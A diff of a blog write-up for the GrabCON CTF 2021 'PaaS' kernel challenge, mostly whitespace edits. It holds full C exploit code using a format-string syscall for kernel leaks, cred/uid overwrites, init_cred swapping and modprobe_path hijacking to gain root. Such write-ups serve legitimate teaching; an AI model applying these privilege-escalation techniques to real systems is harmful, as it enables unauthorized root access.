@@ -9,11 +9,13 @@ summary: Write for kernel challenge named PaaS from GrabCON 2021 CTF.
 I played GrabCON CTF 2021 to check the challenges. PaaS especially got my attention because it is a kernel exploitation challenge. I thought it is the best time I work on some kernel challenges. So, I will approach it as a beginner and try to explain as much as I can. I did not solve it during the CTF. Shoutout to `00xc#0275` from Scavengar Security for being the only person who solved it during the CTF. Checkout his [writeup](https://scavengersecurity.com/posts/grabcon-paas/) also. You can download the challenge file [here](https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/grabcon_pass/).
 
 # Environment Setup
+
 You get `bzImage`, `run.sh` and `printf.c` files and `initramfs` folder when you extract the provided file.<br/>
 First we will extract `vmlinux` file from `bzImage` using [this](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) script. `vmlinux` is uncompressed kernel file. But, we need to convert this into an elf file for getting the symbols. For this, I used [this](https://github.com/marin-m/vmlinux-to-elf/) script. I named the elf file `vmlinux_elf`.<br/>
 Second, we need to change some configuration to be able to debug the challenge. For a gdb connection, add `-gdb tcp::<port>` to the qemu command in `run.sh`. To connect to the connection, start gdb with the `vmlinux_elf` file. Then run `target remote :<port>`. Adding `-S` to the qemu will make it stop until the gdb is connected. I advise to disable kaslr, smep, smap and kpti for the purpose of debugging.<br/>
 Lastly, to be able to read some files we will change the uid in `initramfs/init` file from `1000` to `0`.<br/>
 To run the challenge we need to compress the `initramfs` folder to a cpio archive. I used to following `run.sh` file to compile the exploit to test, compress `initramfs` and run qemu. (I ran it inside `initramfs` folder)
+
 ```bash
 #!/bin/bash
 
@@ -22,8 +24,11 @@ find . -print0 | cpio --null -ov --format=newc | gzip -1 > ../initramfs.cpio.gz
 
 qemu-system-x86_64 -m 256M -initrd ../initramfs.cpio.gz -kernel ../bzImage -nographic -monitor /dev/null -append "nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" -gdb tcp::9001 -S
 ```
+
 # Source code analysis
+
 Pass is short for Printf-as-a-syscall. In the provided kernel, a syscall named printf is added which takes an array of `char` pointers and implements some printf functionality. The source code is below: -
+
 ```c
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
@@ -200,6 +205,7 @@ SYSCALL_DEFINE1(printf, char **, data) {
 ```
 
 Reading the code reveals that we can: -
+
 - print a value as pointer.
 - print a string.
 - write (restricted) int, short and char values.
@@ -211,12 +217,15 @@ Also, there is no null termination of the string to be printed.<br/>
 The resultant string is written to `stdin`.
 
 # Pre-Exploitation
+
 ## Setup
+
 First of all, we need to get output of the syscall. We cannot read it via read, fread, scanf etc. I used fifo pipes for this. I replaced the stdin of my exploit to a fifo. This way the output is written to the fifo file and I can read it using simple file operations.<br/>
 But, this approach has its own peculiarities. We need to read all the remaining contents of the fifo file before reading any new input, otherwise the outputs get mixed. For this I used `clear_stdin` function to clear the stdin.<br/>
 Also, fifos are unseekable. So, we cannot change the offset pointer to read any offset.<br/>
 I created a helper function `read_ptr_stdin` to read a QWORD from the fifo file.<br/>
 My setup is below: -
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -280,35 +289,43 @@ int main(int argc, char *argv[]){
 ```
 
 ## Getting a leak
+
 Having arbitrary read and write primitives is useless without a kernel leak.<br/>
 For the leak, I will abuse the fact that there is no null termination.<br/>
 Since the string is allocated on kernel, there is a high chance that there are string adjacent to out string. In kernel heap, (as far as I know) heap allocations of same size are adjacent to each other (like jemalloc). Upon trial-and-error, I found that giving a 8-byte length string, leaks a heap pointer which is adjacent to out string.<br/>
 I added `xxd` to `initramfs` to check the raw bytes.
+
 ```
 / $ ./exploit 12345678 | xxd
 00000000: 3132 3334 3536 3738 50b5 0204 8088 ffff  12345678P.......
 00000010: 3a61 2d30 3030 3030 3634 0a              :a-0000064.
 ```
+
 It turns out that this pointer points to some strings and some pointers. But, after that there is a kernel address.
+
 ```
 gef➤  telescope 0xffff88800402b550  70
 0xffff88800402b550│+0x0000: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
-0xffff88800402b558│+0x0008: 0xffff88800402b570  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
+0xffff88800402b558│+0x0008: 0xffff88800402b570  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873
 0xffff88800402b560│+0x0010: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
-0xffff88800402b568│+0x0018: 0xffff88800402b5a0  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
+0xffff88800402b568│+0x0018: 0xffff88800402b5a0  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873
 0xffff88800402b570│+0x0020: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
 [truncated]
-0xffff88800402b760│+0x0210: 0xffffffff82074ec0  →  0x0000000000000000  →  0x0000000000000000                                                                      
+0xffff88800402b760│+0x0210: 0xffffffff82074ec0  →  0x0000000000000000  →  0x0000000000000000
 [truncated]
 ```
+
 Thanks to the symbols, it turns out to be the address of `tty_dev_attr_group`.
+
 ```
 # readelf -Ws ./vmlinux_elf| grep ffffffff82074ec0
  30380: ffffffff82074ec0     0 OBJECT  LOCAL  DEFAULT    2 tty_dev_attr_group
 ```
+
 Its offset from kernel base (startup_64) is `0xffffffff82074ec0 - 0xffffffff81000000 = 0x1074ec0`.<br/>
 But the offset between the leaked pointer and between `tty_dev_attr_group` address is not constant. So, we have to leak a couple of values and check each value. I created `get_leak` function for this.<br/>
 I implemented the arbitrary read in `arb_read` and made a wrapper `arb_read_ptr` around it because sometimes the values had null bytes in them.<br/>
+
 ```c
 uint64_t arb_read(uint64_t ptr){
     clear_stdin();
@@ -319,7 +336,7 @@ uint64_t arb_read(uint64_t ptr){
 uint64_t arb_read_ptr(uint64_t ptr){
     char tmp[8];
     uint64_t ret;
-    
+
     arb_read(ptr);
     ret = read_ptr_stdin();
 
@@ -362,13 +379,18 @@ int main(int argc, char *argv[]){
     printf("kernel base: %p\n", kbase);
 }
 ```
+
 # Exploitation
+
 In kernel pwn, our objective is to escalate our privileges to root. It is usually done in two ways.
+
 - Overwriting the uids (uid, gid, euid, egid etc) in `cred` of `task_struct` of the current process.
 - Executing `commit_creds(prepare_kernel_creds(0))`.
 
 ## What is task_struct and cred?
+
 In linux, every process has a task_struct associated with it. It contains all information about the process (pid, file name, etc). It has a member called `cred` of type `struct cred`. It contains information about the privileges of the process (uid, gid, euid etc).
+
 ```c
 struct task_struct {
 [truncated]
@@ -412,14 +434,18 @@ struct cred {
 	kgid_t		fsgid;		/* GID for VFS ops */
 [truncated]
 ```
+
 You can have a look at their full structure. [task_struct](https://elixir.bootlin.com/linux/v5.13.12/source/include/linux/sched.h#L657) [cred](https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110)
 task_struct is stored at a fixed offset (`current_task`) from `__per_cpu_offset`. The `__per_cpu_offset` is an array of pointers to addresses which is fixed for a cpu but is subjected to kaslr (meaning it has a fixed offset from kernel base).
+
 ```
 # readelf -Ws ./vmlinux_elf| grep -E '__per_cpu_offset| current_task'
  92101: 0000000000016d00     0 OBJECT  GLOBAL DEFAULT  ABS current_task
-118643: ffffffff824176a0     0 OBJECT  GLOBAL DEFAULT    2 __per_cpu_offset                     
+118643: ffffffff824176a0     0 OBJECT  GLOBAL DEFAULT    2 __per_cpu_offset
 ```
+
 So, the address of task_struct of current process is `*(*__per_cpu_offset[0]+0x16d00)`.
+
 ```c
 int main(int argc, char *argv[]){
     uint64_t ptr = get_leak();
@@ -435,14 +461,17 @@ int main(int argc, char *argv[]){
     printf("task_struct: %p\n", task_struct);
 }
 ```
+
 You can have a look at [this](https://github.com/slavaim/linux-notes/blob/master/current_task.md) for clearing things.
 Let's get to actual exploitation now.
 
 ## Overwriting uids in task_struct->cred
+
 As I explained earlier, `task_struct->cred` stores uid, gid, euid etc of the process. For escalating, we can overwrite these to make the kernel think that a process was started by `root`.<br/>
 For this we need to get the offset of `cred` in `task_struct`. Usually, it is done by [making a kernel module](https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html). But, I wanted to have some other solution. I looked at the source code of `prepare_creds` function and it accessed the `cred` member from current `task_struct`. When I decompiled the function I saw the offset used.
+
 ```
-gef➤  disas prepare_creds 
+gef➤  disas prepare_creds
 Dump of assembler code for function prepare_creds:
    0xffffffff8108d1e0 <+0>:     push   r12
    0xffffffff8108d1e2 <+2>:     mov    rdi,QWORD PTR [rip+0x1e06fe7] # 0xffffffff82e941d0
@@ -465,7 +494,9 @@ Dump of assembler code for function prepare_creds:
    0xffffffff8108d238 <+88>:    mov    eax,0x1
 [truncated]
 ```
+
 So, we got `0x6b8` as offset. Let's add this to our exploit.
+
 ```c
 int main(int argc, char *argv[]){
     uint64_t ptr = get_leak();
@@ -484,7 +515,9 @@ int main(int argc, char *argv[]){
     printf("current cred: %p\n", current_cred);
 }
 ```
+
 Now we just need to write `0` to the uids. Initially I overwrote all six with zero. Upon trial-and-error, I found out that overwriting only `uid` and `euid` is enough. I changed the uid in `init` back to `1000` to see it in gdb. I found out that the uids start after an int.
+
 ```c
 int main(int argc, char *argv[]){
     uint64_t ptr = get_leak();
@@ -502,7 +535,7 @@ int main(int argc, char *argv[]){
     printf("task_struct: %p\n", task_struct);
     printf("current cred: %p\n", current_cred);
 
-    char *data[] = {"%n%n", 
+    char *data[] = {"%n%n",
         current_cred + 1*4, // uid
         current_cred + 5*4  // euid
     };
@@ -511,15 +544,20 @@ int main(int argc, char *argv[]){
     system("id; cat /root/flag.txt");
 }
 ```
+
 Unfortunately, we cannot get a shell because our stdin is set to the fifo. I just called `id` to check if the overwrite worked and read the flag.
 
 ## Overwrite task_struct->cred to init_cred
+
 If you don't want to overwrite the uids or due to some reason you can only write 8 bytes, you can overwrite current `task_struct->cred` with `init_cred`. `init_cred` is a default `cred` which is used for `init_task`. You can get the address from `vmlinux_elf` and calculate the offset.
+
 ```
 # readelf -Ws ./vmlinux_elf| grep init_cred
 118934: ffffffff8264e400     0 OBJECT  GLOBAL DEFAULT   12 init_cred
 ```
+
 `0xffffffff8264e400 - 0xffffffff81000000 = 0x164e400`
+
 ```c
 int main(int argc, char *argv[]){
     uint64_t ptr = get_leak();
@@ -539,7 +577,9 @@ int main(int argc, char *argv[]){
     printf("init_cred: %p\n", init_cred);
 }
 ```
+
 I made a function `write_long` for writing it once because if we write it in parts, a check will result in a segfault. The check is done during `kernel_write` to check whether the file has proper permissions; which is done using the `cred`. If we write in parts, `cred` will point to some other place (maybe non-existent) and will result in segfault.
+
 ```c
 void write_long(uint64_t where, uint64_t what){
     char fmt[0x50];
@@ -547,7 +587,7 @@ void write_long(uint64_t where, uint64_t what){
     uint16_t part1_lower = part1 & 0xffff, part1_upper = part1 >> 16;
     uint16_t part2_lower = part2 & 0xffff, part2_upper = part2 >> 16;
 
-    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower, 
+    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower,
     (part1_upper > part1_lower) ? part1_upper - part1_lower : part1_upper - part1_lower + 0x10000,
     (part2_lower > part1_upper) ? part2_lower - part1_upper : part2_lower - part1_upper + 0x10000,
     (part2_upper > part2_lower) ? part2_upper - part2_lower : part2_upper - part2_lower + 0x10000
@@ -580,12 +620,16 @@ int main(int argc, char *argv[]){
 ```
 
 ## Modprobe method
+
 This is more of a shortcut especially for ctfs. You can read the details [here](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/). Bascially, it lets us execute any program/script as root. For this, we just need address of `modprobe_path`. Then, write path to out program/script to run as root and execute a script with invalid header. I modified `init` function for making a shell script to get the flag and a file with invalid header. Note that you won't get the output of the shell script, so I used the script to make the flag file world-readable.
+
 ```
 # readelf -Ws ./vmlinux_elf| grep -E 'modprobe_path'
 118942: ffffffff8264ec60     0 OBJECT  GLOBAL DEFAULT   12 modprobe_path
 ```
+
 `0xffffffff8264ec60 - 0xffffffff81000000 = 0x164ec60`
+
 ```c
 __attribute__((constructor)) void init(){
     mkfifo("/home/user/check_fifo", 0666);
@@ -625,8 +669,11 @@ int main(int argc, char *argv[]){
     system("cat /root/flag.txt");
 }
 ```
+
 # Final exploits
+
 ## Overwriting uids in task_struct->cred
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -686,7 +733,7 @@ uint64_t arb_read(uint64_t ptr){
 uint64_t arb_read_ptr(uint64_t ptr){
     char tmp[8];
     uint64_t ret;
-    
+
     arb_read(ptr);
     ret = read_ptr_stdin();
 
@@ -711,7 +758,7 @@ uint64_t get_leak(){
     read_ptr_stdin();
     ptr = read_ptr_stdin();
 
-    printf("%p\n", ptr);    
+    printf("%p\n", ptr);
     clear_stdin();
 
     while((leak & 0xffff) != 0x4ec0){
@@ -739,7 +786,7 @@ int main(int argc, char *argv[]){
     printf("task_struct: %p\n", task_struct);
     printf("current cred: %p\n", current_cred);
 
-    char *data[] = {"%n%n", 
+    char *data[] = {"%n%n",
         current_cred + 1*4, // uid
         current_cred + 5*4  // euid
     };
@@ -748,7 +795,9 @@ int main(int argc, char *argv[]){
     system("id; cat /root/flag.txt");
 }
 ```
+
 ## Overwrite task_struct->cred to init_cred
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -808,7 +857,7 @@ uint64_t arb_read(uint64_t ptr){
 uint64_t arb_read_ptr(uint64_t ptr){
     char tmp[8];
     uint64_t ret;
-    
+
     arb_read(ptr);
     ret = read_ptr_stdin();
 
@@ -833,7 +882,7 @@ uint64_t get_leak(){
     read_ptr_stdin();
     ptr = read_ptr_stdin();
 
-    printf("%p\n", ptr);    
+    printf("%p\n", ptr);
     clear_stdin();
 
     while((leak & 0xffff) != 0x4ec0){
@@ -851,7 +900,7 @@ void write_long(uint64_t where, uint64_t what){
     uint16_t part1_lower = part1 & 0xffff, part1_upper = part1 >> 16;
     uint16_t part2_lower = part2 & 0xffff, part2_upper = part2 >> 16;
 
-    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower, 
+    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower,
     (part1_upper > part1_lower) ? part1_upper - part1_lower : part1_upper - part1_lower + 0x10000,
     (part2_lower > part1_upper) ? part2_lower - part1_upper : part2_lower - part1_upper + 0x10000,
     (part2_upper > part2_lower) ? part2_upper - part2_lower : part2_upper - part2_lower + 0x10000
@@ -883,7 +932,9 @@ int main(int argc, char *argv[]){
 }
 
 ```
+
 ## Modprobe method
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -945,7 +996,7 @@ uint64_t arb_read(uint64_t ptr){
 uint64_t arb_read_ptr(uint64_t ptr){
     char tmp[8];
     uint64_t ret;
-    
+
     arb_read(ptr);
     ret = read_ptr_stdin();
 
@@ -970,7 +1021,7 @@ uint64_t get_leak(){
     read_ptr_stdin();
     ptr = read_ptr_stdin();
 
-    printf("%p\n", ptr);    
+    printf("%p\n", ptr);
     clear_stdin();
 
     while((leak & 0xffff) != 0x4ec0){
